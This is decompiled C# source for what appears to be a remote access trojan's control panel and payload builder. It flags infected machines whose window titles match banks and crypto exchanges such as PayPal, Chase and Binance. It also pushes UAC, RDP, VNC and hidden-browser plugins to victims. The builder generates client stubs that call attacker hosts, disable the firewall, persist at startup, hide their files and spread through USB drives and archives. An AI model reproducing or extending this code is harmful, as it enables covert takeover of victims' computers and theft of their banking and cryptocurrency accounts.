					listViewItem8.ForeColor = Color.Orange;
					listViewItem8.SubItems.Add(L1.Rows[num11].Cells[4].Value.ToString());
					listViewItem8.SubItems.Add(L1.Rows[num11].Cells[2].Value.ToString());
					listViewItem8.SubItems.Add("www.Paypal.com");
					listViewItem8.ImageIndex = 1;
					ListView2.Items.Add(listViewItem8);
				}
			}
			int num12 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num13 = 0; num13 <= num12; num13++)
			{
				if (Operators.CompareString(L1.Rows[num13].Cells[14].Value.ToString().Substring(0, 6), "Paypal", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem9 = new ListViewItem();
					listViewItem9.ForeColor = Color.Orange;
					listViewItem9.SubItems.Add(L1.Rows[num13].Cells[4].Value.ToString());
					listViewItem9.SubItems.Add(L1.Rows[num13].Cells[2].Value.ToString());
					listViewItem9.SubItems.Add("www.Paypal.com");
					listViewItem9.ImageIndex = 1;
					ListView2.Items.Add(listViewItem9);
				}
			}
			int num14 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num15 = 0; num15 <= num14; num15++)
			{
				if (Operators.CompareString(L1.Rows[num15].Cells[14].Value.ToString().Substring(0, 14), "www.paypal.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem10 = new ListViewItem();
					listViewItem10.ForeColor = Color.Orange;
					listViewItem10.SubItems.Add(L1.Rows[num15].Cells[4].Value.ToString());
					listViewItem10.SubItems.Add(L1.Rows[num15].Cells[2].Value.ToString());
					listViewItem10.SubItems.Add("www.Paypal.com");
					listViewItem10.ImageIndex = 1;
					ListView2.Items.Add(listViewItem10);
				}
			}
			int num16 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num17 = 0; num17 <= num16; num17++)
			{
				if (Operators.CompareString(L1.Rows[num17].Cells[14].Value.ToString().Substring(0, 6), "WWW.Paypal.Com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem11 = new ListViewItem();
					listViewItem11.ForeColor = Color.LimeGreen;
					listViewItem11.SubItems.Add(L1.Rows[num17].Cells[4].Value.ToString());
					listViewItem11.SubItems.Add(L1.Rows[num17].Cells[2].Value.ToString());
					listViewItem11.SubItems.Add("www.Paypal.com");
					listViewItem11.ImageIndex = 1;
					ListView2.Items.Add(listViewItem11);
				}
			}
			int num18 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num19 = 0; num19 <= num18; num19++)
			{
				if (Operators.CompareString(L1.Rows[num19].Cells[14].Value.ToString().Substring(0, 6), "WWW.Paypal.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem12 = new ListViewItem();
					listViewItem12.ForeColor = Color.LimeGreen;
					listViewItem12.SubItems.Add(L1.Rows[num19].Cells[4].Value.ToString());
					listViewItem12.SubItems.Add(L1.Rows[num19].Cells[2].Value.ToString());
					listViewItem12.SubItems.Add("www.Paypal.com");
					listViewItem12.ImageIndex = 1;
					ListView2.Items.Add(listViewItem12);
				}
			}
			int num20 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num21 = 0; num21 <= num20; num21++)
			{
				if (Operators.CompareString(L1.Rows[num21].Cells[14].Value.ToString().Substring(0, 21), "Log in to your PayPal", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem13 = new ListViewItem();
					listViewItem13.ForeColor = Color.Aqua;
					listViewItem13.SubItems.Add(L1.Rows[num21].Cells[4].Value.ToString());
					listViewItem13.SubItems.Add(L1.Rows[num21].Cells[2].Value.ToString());
					listViewItem13.SubItems.Add("www.Paypal.com");
					listViewItem13.ImageIndex = 1;
					ListView2.Items.Add(listViewItem13);
				}
			}
			int num22 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num23 = 0; num23 <= num22; num23++)
			{
				if (Operators.CompareString(L1.Rows[num23].Cells[14].Value.ToString().Substring(0, 6), "exodus", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem14 = new ListViewItem();
					listViewItem14.ForeColor = Color.Aqua;
					listViewItem14.SubItems.Add(L1.Rows[num23].Cells[4].Value.ToString());
					listViewItem14.SubItems.Add(L1.Rows[num23].Cells[2].Value.ToString());
					listViewItem14.SubItems.Add("www.exodus.com");
					listViewItem14.ImageIndex = 1;
					ListView2.Items.Add(listViewItem14);
				}
			}
			int num24 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num25 = 0; num25 <= num24; num25++)
			{
				if (Operators.CompareString(L1.Rows[num25].Cells[14].Value.ToString().Substring(0, 14), "www.exodus.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem15 = new ListViewItem();
					listViewItem15.ForeColor = Color.Aqua;
					listViewItem15.SubItems.Add(L1.Rows[num25].Cells[4].Value.ToString());
					listViewItem15.SubItems.Add(L1.Rows[num25].Cells[2].Value.ToString());
					listViewItem15.SubItems.Add("www.exodus.com");
					listViewItem15.ImageIndex = 1;
					ListView2.Items.Add(listViewItem15);
				}
			}
			int num26 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num27 = 0; num27 <= num26; num27++)
			{
				if (Operators.CompareString(L1.Rows[num27].Cells[14].Value.ToString().Substring(0, 11), "Best Crypto", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem16 = new ListViewItem();
					listViewItem16.ForeColor = Color.Aqua;
					listViewItem16.SubItems.Add(L1.Rows[num27].Cells[4].Value.ToString());
					listViewItem16.SubItems.Add(L1.Rows[num27].Cells[2].Value.ToString());
					listViewItem16.SubItems.Add("www.exodus.com");
					listViewItem16.ImageIndex = 1;
					ListView2.Items.Add(listViewItem16);
				}
			}
			int num28 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num29 = 0; num29 <= num28; num29++)
			{
				if (Operators.CompareString(L1.Rows[num29].Cells[14].Value.ToString().Substring(0, 14), "Cryptocurrency", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem17 = new ListViewItem();
					listViewItem17.ForeColor = Color.Aqua;
					listViewItem17.SubItems.Add(L1.Rows[num29].Cells[4].Value.ToString());
					listViewItem17.SubItems.Add(L1.Rows[num29].Cells[2].Value.ToString());
					listViewItem17.SubItems.Add("www.okex.com");
					listViewItem17.ImageIndex = 1;
					ListView2.Items.Add(listViewItem17);
				}
			}
			int num30 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num31 = 0; num31 <= num30; num31++)
			{
				if (Operators.CompareString(L1.Rows[num31].Cells[14].Value.ToString().Substring(0, 12), "www.okex.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem18 = new ListViewItem();
					listViewItem18.ForeColor = Color.Aqua;
					listViewItem18.SubItems.Add(L1.Rows[num31].Cells[4].Value.ToString());
					listViewItem18.SubItems.Add(L1.Rows[num31].Cells[2].Value.ToString());
					listViewItem18.SubItems.Add("www.okex.com");
					listViewItem18.ImageIndex = 1;
					ListView2.Items.Add(listViewItem18);
				}
			}
			int num32 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num33 = 0; num33 <= num32; num33++)
			{
				if (Operators.CompareString(L1.Rows[num33].Cells[14].Value.ToString().Substring(0, 4), "okex", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem19 = new ListViewItem();
					listViewItem19.ForeColor = Color.Aqua;
					listViewItem19.SubItems.Add(L1.Rows[num33].Cells[4].Value.ToString());
					listViewItem19.SubItems.Add(L1.Rows[num33].Cells[2].Value.ToString());
					listViewItem19.SubItems.Add("www.okex.com");
					listViewItem19.ImageIndex = 1;
					ListView2.Items.Add(listViewItem19);
				}
			}
			int num34 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num35 = 0; num35 <= num34; num35++)
			{
				if (Operators.CompareString(L1.Rows[num35].Cells[14].Value.ToString().Substring(0, 5), "Chase", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem20 = new ListViewItem();
					listViewItem20.ForeColor = Color.Aqua;
					listViewItem20.SubItems.Add(L1.Rows[num35].Cells[4].Value.ToString());
					listViewItem20.SubItems.Add(L1.Rows[num35].Cells[2].Value.ToString());
					listViewItem20.SubItems.Add("www.chase.com");
					listViewItem20.ImageIndex = 1;
					ListView2.Items.Add(listViewItem20);
				}
			}
			int num36 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num37 = 0; num37 <= num36; num37++)
			{
				if (Operators.CompareString(L1.Rows[num37].Cells[14].Value.ToString().Substring(0, 13), "www.chase.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem21 = new ListViewItem();
					listViewItem21.ForeColor = Color.Aqua;
					listViewItem21.SubItems.Add(L1.Rows[num37].Cells[4].Value.ToString());
					listViewItem21.SubItems.Add(L1.Rows[num37].Cells[2].Value.ToString());
					listViewItem21.SubItems.Add("www.chase.com");
					listViewItem21.ImageIndex = 1;
					ListView2.Items.Add(listViewItem21);
				}
			}
			int num38 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num39 = 0; num39 <= num38; num39++)
			{
				if (Operators.CompareString(L1.Rows[num39].Cells[14].Value.ToString().Substring(0, 15), "Sign in - chase", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem22 = new ListViewItem();
					listViewItem22.ForeColor = Color.Aqua;
					listViewItem22.SubItems.Add(L1.Rows[num39].Cells[4].Value.ToString());
					listViewItem22.SubItems.Add(L1.Rows[num39].Cells[2].Value.ToString());
					listViewItem22.SubItems.Add("www.chase.com");
					listViewItem22.ImageIndex = 1;
					ListView2.Items.Add(listViewItem22);
				}
			}
			int num40 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num41 = 0; num41 <= num40; num41++)
			{
				if (Operators.CompareString(L1.Rows[num41].Cells[14].Value.ToString().Substring(0, 11), "Credit Card", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem23 = new ListViewItem();
					listViewItem23.ForeColor = Color.Aqua;
					listViewItem23.SubItems.Add(L1.Rows[num41].Cells[4].Value.ToString());
					listViewItem23.SubItems.Add(L1.Rows[num41].Cells[2].Value.ToString());
					listViewItem23.SubItems.Add("www.chase.com");
					listViewItem23.ImageIndex = 1;
					ListView2.Items.Add(listViewItem23);
				}
			}
			int num42 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num43 = 0; num43 <= num42; num43++)
			{
				if (Operators.CompareString(L1.Rows[num43].Cells[14].Value.ToString().Substring(0, 16), "Consumer banking", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem24 = new ListViewItem();
					listViewItem24.ForeColor = Color.Aqua;
					listViewItem24.SubItems.Add(L1.Rows[num43].Cells[4].Value.ToString());
					listViewItem24.SubItems.Add(L1.Rows[num43].Cells[2].Value.ToString());
					listViewItem24.SubItems.Add("www.usbank.com");
					listViewItem24.ImageIndex = 1;
					ListView2.Items.Add(listViewItem24);
				}
			}
			int num44 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num45 = 0; num45 <= num44; num45++)
			{
				if (Operators.CompareString(L1.Rows[num45].Cells[14].Value.ToString().Substring(0, 6), "usbank", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem25 = new ListViewItem();
					listViewItem25.ForeColor = Color.Aqua;
					listViewItem25.SubItems.Add(L1.Rows[num45].Cells[4].Value.ToString());
					listViewItem25.SubItems.Add(L1.Rows[num45].Cells[2].Value.ToString());
					listViewItem25.SubItems.Add("www.usbank.com");
					listViewItem25.ImageIndex = 1;
					ListView2.Items.Add(listViewItem25);
				}
			}
			int num46 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num47 = 0; num47 <= num46; num47++)
			{
				if (Operators.CompareString(L1.Rows[num47].Cells[14].Value.ToString().Substring(0, 14), "www.usbank.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem26 = new ListViewItem();
					listViewItem26.ForeColor = Color.Aqua;
					listViewItem26.SubItems.Add(L1.Rows[num47].Cells[4].Value.ToString());
					listViewItem26.SubItems.Add(L1.Rows[num47].Cells[2].Value.ToString());
					listViewItem26.SubItems.Add("www.usbank.com");
					listViewItem26.ImageIndex = 1;
					ListView2.Items.Add(listViewItem26);
				}
			}
			int num48 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num49 = 0; num49 <= num48; num49++)
			{
				if (Operators.CompareString(L1.Rows[num49].Cells[14].Value.ToString().Substring(0, 5), "CIT |", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem27 = new ListViewItem();
					listViewItem27.ForeColor = Color.Aqua;
					listViewItem27.SubItems.Add(L1.Rows[num49].Cells[4].Value.ToString());
					listViewItem27.SubItems.Add(L1.Rows[num49].Cells[2].Value.ToString());
					listViewItem27.SubItems.Add("www.cit.com");
					listViewItem27.ImageIndex = 1;
					ListView2.Items.Add(listViewItem27);
				}
			}
			int num50 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num51 = 0; num51 <= num50; num51++)
			{
				if (Operators.CompareString(L1.Rows[num51].Cells[14].Value.ToString().Substring(0, 5), "CIT |", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem28 = new ListViewItem();
					listViewItem28.ForeColor = Color.Aqua;
					listViewItem28.SubItems.Add(L1.Rows[num51].Cells[4].Value.ToString());
					listViewItem28.SubItems.Add(L1.Rows[num51].Cells[2].Value.ToString());
					listViewItem28.SubItems.Add("www.cit.com");
					listViewItem28.ImageIndex = 1;
					ListView2.Items.Add(listViewItem28);
				}
			}
			int num52 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num53 = 0; num53 <= num52; num53++)
			{
				if (Operators.CompareString(L1.Rows[num53].Cells[14].Value.ToString().Substring(0, 7), "Bitcoin", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem29 = new ListViewItem();
					listViewItem29.ForeColor = Color.Aqua;
					listViewItem29.SubItems.Add(L1.Rows[num53].Cells[4].Value.ToString());
					listViewItem29.SubItems.Add(L1.Rows[num53].Cells[2].Value.ToString());
					listViewItem29.SubItems.Add("Bitcoin");
					listViewItem29.ImageIndex = 1;
					ListView2.Items.Add(listViewItem29);
				}
			}
			int num54 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num55 = 0; num55 <= num54; num55++)
			{
				if (Operators.CompareString(L1.Rows[num55].Cells[14].Value.ToString().Substring(0, 7), "binance", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem30 = new ListViewItem();
					listViewItem30.ForeColor = Color.Aqua;
					listViewItem30.SubItems.Add(L1.Rows[num55].Cells[4].Value.ToString());
					listViewItem30.SubItems.Add(L1.Rows[num55].Cells[2].Value.ToString());
					listViewItem30.SubItems.Add("www.binance.com");
					listViewItem30.ImageIndex = 1;
					ListView2.Items.Add(listViewItem30);
				}
			}
			int num56 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num57 = 0; num57 <= num56; num57++)
			{
				if (Operators.CompareString(L1.Rows[num57].Cells[14].Value.ToString().Substring(0, 7), "Egbank", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem31 = new ListViewItem();
					listViewItem31.ForeColor = Color.Aqua;
					listViewItem31.SubItems.Add(L1.Rows[num57].Cells[4].Value.ToString());
					listViewItem31.SubItems.Add(L1.Rows[num57].Cells[2].Value.ToString());
					listViewItem31.SubItems.Add("www.binance.com");
					listViewItem31.ImageIndex = 1;
					ListView2.Items.Add(listViewItem31);
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void method_74(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("uac.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_75(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("RDP.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_76(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("vnc.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_77(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("HBR.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_78(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("VDP.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_79(object sender, EventArgs e)
	{
	}

	public string Randomi(int lenght)
	{
		string text = "顾氏家族的成泽是顾商城公司的首席执行官顾太太希望她的生物孙";
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= lenght; i++)
		{
			int startIndex = rand.Next(0, text.Length);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	public void method_80(object sender, EventArgs e)
	{
		string stub = Resources.Stub;
		if (Operators.CompareString(Class2.XTBfo6WOm.License.RichTextBox1.Text.ToString(), null, TextCompare: false) != 0)
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			string text = string.Empty;
			string text2 = string.Empty;
			if (Listkill.Items.Count == 0)
			{
				Kill_Process.Checked = false;
			}
			if (ListView_Socket.Items.Count != 0)
			{
				string newValue = default(string);
				if (Kill_Process.Checked)
				{
					try
					{
						int num = 0;
						foreach (ListViewItem item in Listkill.Items)
						{
							_ = item;
							ref string reference = ref string_4;
							reference = reference + Listkill.Items[num].SubItems[0].Text + ",";
							num++;
						}
						int_1 = Conversions.ToInteger(Conversions.ToString(string_4).Length - 1);
						newValue = Conversions.ToString(string_4).Substring(Conversions.ToInteger(0), Conversions.ToInteger(int_1));
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
				if (!IPDNS.Checked)
				{
					int num2 = 0;
					foreach (ListViewItem item2 in ListView_Socket.Items)
					{
						_ = item2;
						text2 = text2 + ListView_Socket.Items[num2].SubItems[1].Text + ",";
						num2++;
					}
				}
				else
				{
					int num3 = 0;
					foreach (ListViewItem item3 in ListView_Socket.Items)
					{
						_ = item3;
						if (!Encrypt_ifo.Checked)
						{
							text = text + "\"" + ListView_Socket.Items[num3].SubItems[1].Text + "\",";
						}
						else
						{
							string obj = text;
							ListViewItem.ListViewSubItem listViewSubItem;
							string text3 = (listViewSubItem = ListView_Socket.Items[num3].SubItems[1]).Text;
							string obj2 = Class6.smethod_7(ref text3);
							listViewSubItem.Text = text3;
							text = obj + "\"" + obj2 + "\",";
						}
						num3++;
					}
				}
				int length = text.Length - 1;
				string text4 = string.Empty;
				int num4 = 0;
				foreach (ListViewItem item4 in ListView_Socket.Items)
				{
					_ = item4;
					if (Encrypt_ifo.Checked)
					{
						string obj3 = text4;
						ListViewItem.ListViewSubItem listViewSubItem;
						string text3 = (listViewSubItem = ListView_Socket.Items[num4].SubItems[2]).Text;
						string obj4 = Class6.smethod_7(ref text3);
						listViewSubItem.Text = text3;
						text4 = obj3 + "\"" + obj4 + "\",";
					}
					else
					{
						text4 = text4 + ListView_Socket.Items[num4].SubItems[2].Text + ",";
					}
					num4++;
				}
				int length2 = text4.Length - 1;
				try
				{
					SaveFileDialog saveFileDialog = new SaveFileDialog();
					saveFileDialog.Filter = EXEC();
					saveFileDialog.FileName = "Client";
					if (saveFileDialog.ShowDialog() == DialogResult.OK)
					{
						stub = Strings.Replace(stub, "#Const Release = False", "#Const Release = True");
						string expression = stub;
						int iLength = 8;
						stub = Strings.Replace(expression, "%RN%", GenerateRandomString(ref iLength));
						string expression2 = stub;
						Guna2TextBox nameClient;
						string text3 = (nameClient = NameClient).Text;
						string replacement = Class6.smethod_7(ref text3);
						nameClient.Text = text3;
						stub = Strings.Replace(expression2, "%Name%", replacement);
						if (IPDNS.Checked)
						{
							if (Encrypt_ifo.Checked)
							{
								stub = Strings.Replace(stub, "Program.hh = Functions.H.Item(New Random().Next(0, Functions.H.Count))", "Program.hh = Functions.BS(Convert.FromBase64String(Functions.H.Item(New Random().Next(0, Functions.H.Count))))");
								stub = Strings.Replace(stub, "%Host%", Strings.RSet(text, length));
								stub = Strings.Replace(stub, "#Const Patebin = Nothing", "");
							}
							else
							{
								stub = Strings.Replace(stub, "%Host%", Strings.RSet(text, length));
								stub = Strings.Replace(stub, "#Const Patebin = Nothing", "");
							}
						}
						else if (!Encrypt_ifo.Checked)
						{
							stub = Strings.Replace(stub, "{%Host%}", "");
							stub = Strings.Replace(stub, "#Const Patebin = Nothing", Resources.Pastebin.Replace("$$$$", text2).Replace("|ENC|", "").Replace("|E|", ""));
						}
						else
						{
							stub = Strings.Replace(stub, "{%Host%}", "");
							stub = Strings.Replace(stub, "#Const Patebin = Nothing", Resources.Pastebin.Replace("$$$$", Class6.smethod_7(ref text2)).Replace("|ENC|", "Functions.BS(Convert.FromBase64String(").Replace("|E|", "))"));
						}
						if (Encrypt_ifo.Checked)
						{
							stub = Strings.Replace(stub, "Program.pp = Functions.P.Item(New Random().Next(0, Functions.P.Count))", "Program.pp = Functions.BS(Convert.FromBase64String(Functions.P.Item(New Random().Next(0, Functions.P.Count))))");
						}
						stub = Strings.Replace(stub, "%Port%", Strings.RSet(text4, length2));
						stub = ((!Add_Firewall.Checked) ? Strings.Replace(stub, "#Const AddFirewall = Nothing", "") : Strings.Replace(stub, "#Const AddFirewall = Nothing", Resources.AddFirewall));
						if (Delay.Checked)
						{
							if (Operators.CompareString(Num_Delay.Text, null, TextCompare: false) == 0)
							{
								Num_Delay.Text = Conversions.ToString(3);
							}
							stub = Strings.Replace(stub, "#Const Delay = Nothing", "Thread.Sleep(3 * 1000)".Replace("3", Num_Delay.Text));
						}
						else
						{
							stub = Strings.Replace(stub, "#Const Delay = Nothing", "");
						}
						stub = ((!TurnOff_Firewall.Checked) ? Strings.Replace(stub, "#Const urnoffFirewall = Nothing", "") : Strings.Replace(stub, "#Const urnoffFirewall = Nothing", Resources.TurnOffFirewall));
						if (Discord.Checked)
						{
							if (Encrypt_ifo.Checked)
							{
								string expression3 = stub;
								string discord = Resources.Discord;
								text3 = (nameClient = Discord_URL).Text;
								string newValue2 = Class6.smethod_7(ref text3);
								nameClient.Text = text3;
								stub = Strings.Replace(expression3, "#Const Discord = Nothing", discord.Replace("%url%", newValue2).Replace("$Host$", "Program.hh").Replace("$Port$", "Program.pp")
									.Replace("|ENC|", "Functions.BS(Convert.FromBase64String(")
									.Replace("|E|", "))")
									.Replace("|E|", "))"));
							}
							else
							{
								stub = Strings.Replace(stub, "#Const Discord = Nothing", Resources.Discord.Replace("%url%", Discord_URL.Text).Replace("$Host$", "Program.hh").Replace("$Port$", "Program.pp")
									.Replace("|ENC|", "")
									.Replace("|E|", ""));
							}
						}
						else
						{
							stub = Strings.Replace(stub, "#Const Discord = Nothing", "");
						}
						stub = (Rotk.Checked ? Strings.Replace(stub, "%Payload%", "$77-" + Name_Payload.Text + ".exe") : Strings.Replace(stub, "%Payload%", Name_Payload.Text + ".exe"));
						stub = Strings.Replace(stub, "%Folder%", Name_Folder.Text);
						stub = Strings.Replace(stub, "%Dir%", method_81());
						if (!Encrypt.Checked)
						{
							stub = ((!Install_Payload.Checked) ? Strings.Replace(stub, "#Const Install0 = Nothing", "") : (Run_Explorer.Checked ? Strings.Replace(stub, "#Const Install0 = Nothing", Resources.install0.Replace("Process.Start(Program.LO.FullName)", "Process.Start(\"explorer.exe\", Program.LO.FullName)")) : Strings.Replace(stub, "#Const Install0 = Nothing", Resources.install0)));
						}
						stub = ((!Hide_install.Checked) ? Strings.Replace(stub, "#Const Hide_install = Nothing", "") : Strings.Replace(stub, "#Const Hide_install = Nothing", Resources.hinstall));
						stub = ((!h_file.Checked) ? Strings.Replace(stub, "#Const Hide_file = Nothing", "") : Strings.Replace(stub, "#Const Hide_file = Nothing", Resources.H_file));
						if (!Encrypt.Checked)
						{
							stub = ((!Auto_Startup.Checked) ? Strings.Replace(stub, "#Const AutoStartu = Nothing", "") : Strings.Replace(stub, "#Const AutoStartu = Nothing", Resources.Auto_Startup));
						}
						stub = (Create_lnk.Checked ? Strings.Replace(stub, "#Const Create_lnk = Nothing", Resources.Create_lnk) : Strings.Replace(stub, "#Const Create_lnk = Nothing", ""));
						stub = ((!Create_vbs.Checked) ? Strings.Replace(stub, "#Const Create_vbs = Nothing", "") : ((!Run_Explorer.Checked) ? Strings.Replace(stub, "#Const Create_vbs = Nothing", Resources.Create_VBS.Replace("explorer.exe ", "")) : Strings.Replace(stub, "#Const Create_vbs = Nothing", Resources.Create_VBS)));
						if (!USB.Checked)
						{
							stub = Strings.Replace(stub, "#Const USB = Nothing", "");
							stub = Strings.Replace(stub, "#Const Run_USB = Nothing", "");
						}
						else
						{
							stub = Strings.Replace(stub, "#Const USB = Nothing", Resources.USB);
							stub = Strings.Replace(stub, "#Const Run_USB = Nothing", Resources.Run_USB);
						}
						if (Srar.Checked | Sexe.Checked | Szip.Checked | Stxt.Checked)
						{
							string sfile = Resources.Sfile;
							sfile = ((!Srar.Checked) ? sfile.Replace("%RAR%", "") : sfile.Replace("%RAR%", Resources.SRAR));
							sfile = (Szip.Checked ? sfile.Replace("%ZIP%", Resources.SZIP) : sfile.Replace("%ZIP%", ""));
							sfile = ((!Sexe.Checked) ? sfile.Replace("%EXE%", "") : sfile.Replace("%EXE%", Resources.SEXE));
							sfile = (Stxt.Checked ? sfile.Replace("%TXT%", Resources.STXT) : sfile.Replace("%TXT%", ""));
							if (!Protect_Spreading.Checked)
							{
								sfile = sfile.Replace("%ULOC%", "");
								sfile = sfile.Replace("%LOC%", "");
							}
							else
							{
								if (!Protect_Install.Checked && !Protect_Startup.Checked)
								{
									stub = Strings.Replace(stub, "#Const Protect_F = Nothing", Resources.Protect);
								}
								sfile = sfile.Replace("%ULOC%", "Unloc(Path)");
